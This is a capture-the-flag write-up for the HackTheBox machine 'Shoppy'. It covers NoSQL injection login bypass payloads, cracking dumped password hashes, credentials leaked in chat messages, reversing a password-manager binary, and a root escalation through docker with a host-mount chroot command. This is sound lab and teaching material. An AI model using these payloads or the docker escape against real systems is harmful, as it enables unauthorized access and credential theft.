# Enumeration

## Nmap Recon

We start by recognizing the OS of the machine.

We do have a domain: [http://shoppy.htb](http://shoppy.htb/)

So we add it to our /etc/hosts file.

```bash
❯ echo "$target shoppy.htb" | sudo tee -a /etc/hosts

```

## Fuzzing

Web fuzzing with `wfuzz`:

## Feroxbuster

We run ferox to discover possible linked directories in the domain and we found out the login page at `/login`

Not much information found in the other ports of the machine.

# Foothold

## SQL and NoSQL injection

After trying some options for a bit, I changed the request type to json and failed to send one, resulting in a 400 Bad Request, but this gave some information in the traceback error.

```bash
SyntaxError: Unexpected string in JSON at position 28
    at JSON.parse (<anonymous>)
    at parse (/home/jaeger/ShoppyApp/node_modules/body-parser/lib/types/json.js:89:19)
    at /home/jaeger/ShoppyApp/node_modules/body-parser/lib/read.js:128:18
    at AsyncResource.runInAsyncScope (node:async_hooks:203:9)
    at invokeCallback (/home/jaeger/ShoppyApp/node_modules/raw-body/index.js:231:16)
    at done (/home/jaeger/ShoppyApp/node_modules/raw-body/index.js:220:7)
    at IncomingMessage.onEnd (/home/jaeger/ShoppyApp/node_modules/raw-body/index.js:280:7)
    at IncomingMessage.emit (node:events:513:28)
    at endReadableNT (node:internal/streams/readable:1359:12)
    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
```

This traceback gives us the working directory from the machine:

`/home/jaeger/ShoppyApp/`

So, we would assume `jaeger` is a potential user in the machine.

---

After looking for a bit about NoSQL injection payloads, I found a way to send all users and receive a hit to `/admin`:

```bash
username=admin' || 'a'=='a&password=admin
```

![Dashboard](/img/htb_img/Shoppy_img/02.png)


We have the option to search, so we search for `admin`.

![Search area](/img/htb_img/Shoppy_img/03.png)


It gives us a button to download a file. It opens an endpoint with a hashed password.

```bash
[
	{ "_id":"62db0e93d6d6a999a66ee67a",
		"username":"admin",
		"password":"23c6877d9e2b564ef8b32c3a23de27b2"
	}
]
```

No hit with rockyou.txt on cracking it.

---

We previously checked that the machine is vulnerable to NoSQL injection, so we try that same thing again, with the following payload:

```bash
admin' || '1'=='1
	# Note that there is no "'" at the end, otherwise it gives an error
```

And we get a hit with another password hash

```bash
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]
```

![Crackstation](/img/htb_img/Shoppy_img/04.png)

So the password for `josh` is `remembermethisway`.

---

We tried logging in to SSH with this credentials but this was not the way:

```bash
❯ ssh josh@$target                                              
The authenticity of host '10.10.11.180 (10.10.11.180)' can't be established.
ED25519 key fingerprint is SHA256:RISsnnLs1eloK7XlOTr2TwStHh2R8hui07wd1iFyB+8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.180' (ED25519) to the list of known hosts.
josh@10.10.11.180's password: 
Permission denied, please try again.
josh@10.10.11.180's password: 
```

So, let’s go back to the `mattermost` subdomain.

The credentials work and we are inside this platform.

We quickly find other user named `jess` posting about his/her cat.

We find other message from `josh` to `jaeger` that says the following:

```bash
Hey @jaeger, when I was trying to install docker on the machine, I started learn C++ and I do a password manager. You can test it if you want, the program is on the deploy machine.
```

So there is a hint for the following steps, probably.

---

On the Deploy Machine chat group, there is a message from `jaeger` with his credentials.

```bash
	
jaeger
10:22 AM

Hey @josh,

For the deploy machine, you can create an account with these creds :
username: jaeger
password: Sh0ppyBest@pp!
And deploy on it.
```

Credentials: `jaeger`:Sh0ppyBest@pp!

---

## SSH Log in with Jaeger credentials

We should try to log in with SSH with this credentials.

```bash
❯ sshpass -p 'Sh0ppyBest@pp!' ssh jaeger@shoppy.htb
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;

Last login: Wed Jul  2 12:37:20 2025 from 10.10.14.X
jaeger@shoppy:~$ 
```

We can obtain the `user.txt`.

# Lateral Movement

```bash
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

We can execute `password-manager` as deploy.

```bash
sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: test
Access denied! This incident will be reported !
```

I’ll get this file to my attacking mach.

```bash
sshpass -p 'Sh0ppyBest@pp!' scp jaeger@shoppy.htb:/home/deploy/password-manager .
```

## Reversing

We open it with Ghidra.

![Ghidra Reversing](/img/htb_img/Shoppy_img/05.png)


We can clearly see the word `Sample`.

This can be also achieved by checking the `strings` of the file, but the 16 bit version of it.

```bash
❯ strings -el password-manager 
Sample
```

---

So, we try that password out:

```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

deploy / Deploying@pp!

We change to the deploy user.

```bash
su deploy
Deploying@pp!
```

# Privilege Escalation

After basic enumeration I remembered that in the Matermost chats they were talking about deploying dockers.

```bash
deploy@shoppy:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
deploy@shoppy:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    d7d3d98c851f   2 years ago   5.53MB
```

No need to mount the whole filesystem so we get command execution with elevated privileges from the docker container.

```bash
deploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine chroot /mnt sh
# cat /root/root.txt
<REDACTED>
```
